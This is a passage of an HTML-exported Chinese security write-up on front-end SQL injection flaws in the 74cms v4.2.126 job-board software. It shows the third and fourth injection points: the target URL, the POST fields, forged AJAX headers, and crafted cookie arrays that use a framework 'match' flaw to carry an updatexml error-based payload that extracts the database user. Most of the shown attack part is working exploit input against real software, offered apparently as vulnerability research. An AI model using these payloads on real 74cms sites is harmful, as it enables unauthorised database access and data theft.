class="cs9FB05234">cookie(members_uc_info)</span><span class="cs7FFD2630">并且合并为</span><span class="cs9FB05234">$data</span><span class="cs7FFD2630">数组进行利用</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;unbind_mobile=1 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">只要有此字段即可，只是单纯为了满足流程判断的</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">cookie:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">members_uc_info[reg_type]=1; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">必须为</span><span class="cs9FB05234">1 </span><span class="cs7FFD2630">满足流程需要</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">members_uc_info[utype]=2; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">必须为</span><span class="cs9FB05234">2 </span><span class="cs7FFD2630">满足流程需要</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">members_uc_info[mobile][0]=match; &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">框架漏洞利用</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">members_uc_info[mobile][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a; &nbsp;// </span><span class="cs7FFD2630">这里输入注入语句</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">headers: &nbsp;// </span><span class="cs7FFD2630">伪造</span><span class="cs9FB05234">ajax</span><span class="cs7FFD2630">操作</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;Content-Type: application/x-www-form-urlencoded</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;X-Requested-With: XMLHttpRequest</span></p><h2 class="cs868C439D">
			<a name="X7efc3fa916604e47e656e2b191cc9e8e587b695"><span class="csB2D98684">0x07 74cms</span><span class="cs83F14626">独有框架漏洞第四处</span></a></h2>
		<p class="cs3A447A38"><span class="cs7FFD2630">文件：</span><span class="cs9FB05234">74cms\upload\Application\Home\Controller\MembersController.class.php</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">方法：</span><span class="cs9FB05234">oauth_reg (</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">是否需登录：需要</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">登录权限：普通用户</span><span class="cs9FB05234">/</span><span class="cs7FFD2630">企业用户都可</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">url: http://74cms.test/index.php?m=&amp;c=Members&amp;a=oauth_reg</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">post:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;username = </span><span class="cs7FFD2630">自己去平台随便注册个账号然后输入那个账号</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;password = </span><span class="cs7FFD2630">自己去平台随便注册个账号然后输入那个密码</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">cookie:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;members_bind_info[type][0]=match;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">members_bind_info[type][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image30.png" width="560" height="262" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image31.png" width="560" height="261" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">看源码</span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image32.png" width="560" height="300" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v4.2.126-%e5%89%8d%e5%8f%b0%e5%9b%9b%e5%a4%84sql%e6%b3%a8%e5%85%a5_files/image33.png" width="560" height="123" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="四参考链接"><span class="cs83F14626">四、参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://www.yuque.com/pmiaowu/bfgkkh/nzr6fl</span></p></body>
</html>
